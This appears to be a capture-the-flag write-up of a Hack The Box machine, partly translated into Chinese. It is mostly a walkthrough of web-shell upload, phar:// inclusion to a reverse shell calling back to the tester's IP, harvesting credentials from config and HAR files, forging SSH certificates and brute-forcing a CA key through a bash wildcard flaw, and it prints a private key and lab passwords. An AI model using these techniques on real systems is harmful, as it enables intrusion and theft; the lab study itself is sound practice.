1, enumerate the ports and services 
22/tcp ssh
80/tcp http
2222/tcp ssh(in this place, it would be wired)

2,enumerate the pages and web services 
by using the default credit 'test:test', we can just login and check these tickets.

by using FUFF, we can check the useful urls or services
```
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 21ms]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 22ms]
.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 23ms]
admin.php               [Status: 200, Size: 46, Words: 7, Lines: 4, Duration: 24ms]
api                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 23ms]
assets                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 23ms]
index.php               [Status: 200, Size: 3120, Words: 291, Lines: 40, Duration: 54ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 19ms]
uploads                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 12ms]

```

In this place, /admin.php and /uploads would be very attractive and we need to check the versions or vulners.

Firstly, when we go to /admin.php, it redirect us to the /login.php. So we just login and use the /uploads to check our web shells or make reverse shell.

`http://itrc.ssg.htb/uploads/test.php?cmd=pwd`

So we can also try to upload the reverse shells to get www-data shell for us.

In this place, we have known it only accept the zip archive, so we want to try to just upload the php file by using the burp
But unluckily, we cannot only pass the front-base, there is still some restriction in the back-base.
So let's try to execute our shell by other way.
Fristly, we have find it needs use "page=?" to get the special page .
So let's try to use it.
But it didnot work.

We have known this is a php-web service, so there would be some other vulners
`phar injection`

Let's try it.
`http://itrc.ssg.htb/?page=phar://uploads/5984bdcb9365435330857c3ce5600055a6bb727c.zip/shell`

Then we get the error messages:
```
**Warning**: Undefined variable $daemon in **phar:///var/www/itrc/uploads/5984bdcb9365435330857c3ce5600055a6bb727c.zip/shell.php** on line **184**  
WARNING: Failed to daemonise. This is quite common and not fatal.  
**Warning**: fsockopen(): Unable to connect to 10.10.16.11:443 (Connection refused) in **phar:///var/www/itrc/uploads/5984bdcb9365435330857c3ce5600055a6bb727c.zip/shell.php** on line **100**  
  
**Warning**: Undefined variable $daemon in **phar:///var/www/itrc/uploads/5984bdcb9365435330857c3ce5600055a6bb727c.zip/shell.php** on line **184**  
Connection refused (111)
```
So let's get this shell !

3, switch www-data to other users
from ifconfig, we would be in the container
```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.223.0.3  netmask 255.255.0.0  broadcast 172.223.255.255
        ether 02:42:ac:df:00:03  txqueuelen 0  (Ethernet)
        RX packets 5912  bytes 1459597 (1.3 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4641  bytes 790042 (771.5 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
And from netstat, we could not find any port of database service.
```
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 localhost:43051         0.0.0.0:*               LISTEN     
tcp6       0      0 [::]:22                 [::]:*                  LISTEN     
udp        0      0 localhost:41576         0.0.0.0:* 
```
Also, before we use nmap to find tcp/2222 has the ssh service ,but in this place,we could not find anything.
So it would aid that we are now in the container.

by check /etc/passwd and we get 3 users:
```
msainristil:x:1000:1000::/home/msainristil:/bin/bash
zzinter:x:1001:1001::/home/zzinter:/bin/bash
support:x:1003:1003:,,,:/home/support:/bin/bash
```

So let's enumerate the configuations!
From db.php:
```
<?php

$dsn = "mysql:host=db;dbname=resourcecenter;";
$dbusername = "jj";
$dbpassword = "ugEG5rR5SG8uPd";
$pdo = new PDO($dsn, $dbusername, $dbpassword);

try {
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Connection failed: " . $e->getMessage());
```

we get the credit of database : `jj:ugEG5rR5SG8uPd`
But we could not connect to database.

So let's check the uploads, maybe there would be something interesting.
let's unzip all of them and check them.
`for file in *.zip; do unzip “$file”; done`

these file would be useful 
`id_ed25519.pub  id_rsa.pub  itrc.ssg.htb.har`

```
itrc.ssg.htb.har 是一个 HAR (HTTP Archive) 文件，它用于记录和分析网页与服务器之间的所有 HTTP 请求和响应。HAR 文件是一个 JSON 格式的日志，包含详细的网络通信数据，如请求头、响应头、请求和响应的内容、加载时间等.

```
So let's check it by using our browser.
`http://itrc.ssg.htb/uploads/itrc.ssg.htb.har`
Then we can find some useful things
```
"headersSize": 647,
          "bodySize": 37,
          "postData": {
            "mimeType": "application/x-www-form-urlencoded",
            "text": "user=msainristil&pass=82yards2closeit",
            "params": [
              {
                "name": "user",
                "value": "msainristil"
              },
              {
                "name": "pass",
                "value": "82yards2closeit"
              }
            ]
          }
        },
```
then we get the credit of msainristil
`msainristil:82yards2closeit`
let's try to use it and we found it could be ssh login.
Then we found a document of decommission_old_ca.
We have certificate authorization files. If you don’t know what they are, I suggest you to learn what they are before reading this article. They are simply being used for Signing&Authorizing keys. Now let’s create key and sign it with ca-itrc.
我们有证书授权文件。如果您不知道它们是什么，我建议您在阅读本文之前了解它们是什么。它们只是用于签名和授权密钥。现在让我们创建密钥并使用 ca-itrc 对其进行签名。
`ssh-keygen -t rsa -b 2048 -f keypair`
t stands for type, -b stands for bytes and -f stands for file. Creating rsa type 2048 bytes long and saving it to keypair. This will create keypair and keypair.pub files. Now we have to sign this with ca-itrc
t 代表类型，-b 代表字节，-f 代表文件。创建 2048 字节长的 rsa 类型并将其保存到密钥对。这将创建 keypair 和 keypair.pub 文件。现在我们必须使用 ca-itrc 对此进行签名
`ssh-keygen -s ca-itrc -n zzinter -I doesntmatter keypair.pub`

`scp msainristil@ssg.htb:/home/msainristil/decommission_old_ca/keypair* . 

Then just ssh to connect it and we can get user.txt

4, switch to root shell
Firstly, we have known we are in the docker container.

Back to the script sign_key_api.sh:
`This is an API for signing pubkeys. Notice how nmap scan did show us 2 ssh ports (22, and 2222). port 22 ssh works on docker, port 2222 should be working on host machine And I think this api works out of docker. Because there were no var/www/signserv directory. It will be easier to use this bash script in our own machine. So I’m downloading this to my kali machine.`
But in this machine, we did not find /var/www/signserv
So we guess it would in the root machine.

Firstly, we use this script to make a cret file of user support
`./sign.sh keypair.pub support support > support.cert`
`ssh -o CertificateFile=support.cert -i keypair support@ssg.htb -p 2222`

Then we found there is only 2 users in /home and when we check the ifconfig, we finally find something we wanted.
```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.27  netmask 255.255.254.0  broadcast 10.10.11.255
        inet6 dead:beef::250:56ff:feb9:1b12  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:1b12  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:1b:12  txqueuelen 1000  (Ethernet)
        RX packets 29687  bytes 3410224 (3.4 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 26916  bytes 7324451 (7.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
Let's enumerate the api or services about ssh or signing-keys.
Come to the file path '/etc/ssh'

SSH principals are listed inside of the auth_principals folder.
SSH 主体列在auth_principals文件夹内
Let’s add these principals into script:
让我们将这些主体添加到脚本中：

`supported_principals="webserver,analytics,support,security,root_user,zzinter_temp"`

Then let's just repeat all the process like before.
```
./sign.sh keypair.pub root root_user > root.cert
ssh -o CertificateFile=root.cert -i keypair root@ssg.htb -p 2222
```
But this time, it give us errors
`{"detail":"Root access must be granted manually. See the IT admin staff."} `

So let's try the other one:
```
./sign.sh keypair.pub zzinter zzinter_temp > zzinter.cert
ssh -o CertificateFile=zzinter.cert -i keypair zzinter@ssg.htb -p 2222
```
Then we can use sudo -l to check what zzinter can do something as root.
```
Matching Defaults entries for zzinter on ssg:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User zzinter may run the following commands on ssg:
    (root) NOPASSWD: /opt/sign_key.sh
```
It looks like the same file
But `-rwxr----- 1 root zzinter 1480 Jul 23 14:02 /opt/sign_key.sh`
we can not change anything of this file.

```
This script can run as root which means it can access to Certificate Authorization file but we can’t modify the script. I want you to be very careful at this point, this script reads the original CA file content and checks if they are same or not, if they’re same it returns error code 1. We can use this vulnerability to bruteforce the CA but since they are very long, it would be almost impossible to bruteforce it. So what are we gonna do? Luckly, bash does wildcard comparing which will give very good advantage.
该脚本可以以 root 身份运行，这意味着它可以访问证书授权文件，但我们无法修改该脚本。我希望你在这一点上要非常小心，这个脚本会读取原始CA文件内容并检查它们是否相同，如果相同则返回错误代码1。我们可以利用此漏洞来暴力破解CA，但是由于它们非常长，几乎不可能对其进行暴力破解。那么我们要做什么？幸运的是，bash 进行通配符比较，这将带来非常好的优势。
```
For example:
```
#!/bin/bash

a='Hello World'
b='Hel*'

if [[ $a == $b ]]; then
  echo 'a = b'
fi

if [[ $b == $a ]]; then
  echo 'b = a'
fi

This script will print ‘a = b’ But not ‘b = a’ because a being compared to b is true but otherwise is not true. This script compares original CA file to input CA. We can manipulate it by inputing RANDOMLETER+* and check if it’s true, and if it is, jump to next character. So we can crack CA using the vulnerability.
该脚本将打印“a = b” ，但不会打印“b = a”，因为 a 与 b 比较为 true，但其他情况则不为 true。该脚本将原始 CA 文件与输入 CA 进行比较。我们可以通过输入 RANDOMLETER+* 来操作它并检查它是否为真，如果是，则跳转到下一个字符。所以我们可以利用该漏洞来破解CA
```

Then we get unknown.key
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQAAAKg7BlysOwZc
rAAAAAtzc2gtZWQyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQ
AAAEBexnpzDJyYdz+91UG3dVfjT/scyWdzgaXlgx75RjYOo4Hg8Cudy1ShyYfqzC3ANlgA
cW7Q4MoZuezAE8mNFSmxAAAAIkdsb2JhbCBTU0cgU1NIIENlcnRmaWNpYXRlIGZyb20gsV
QBAgM=
-----END OPENSSH PRIVATE KEY-----
```

We’ve signed keypair-cert.pub for user ‘root’ now lets login as root and get root.txt
`ssh-keygen -s "$ca_file" -z "$serial" -I "$username" -V -1w:forever -n "$principals" "$public_key_name"`

`ssh-keygen -s root.cert -z 1 -I root -V -1w:forever -n root_user keypair.pub`

then we just connect the root shell
`ssh -o CertificateFile=keypair-cert.pub -i keypair root@ssg.htb -p 2222`


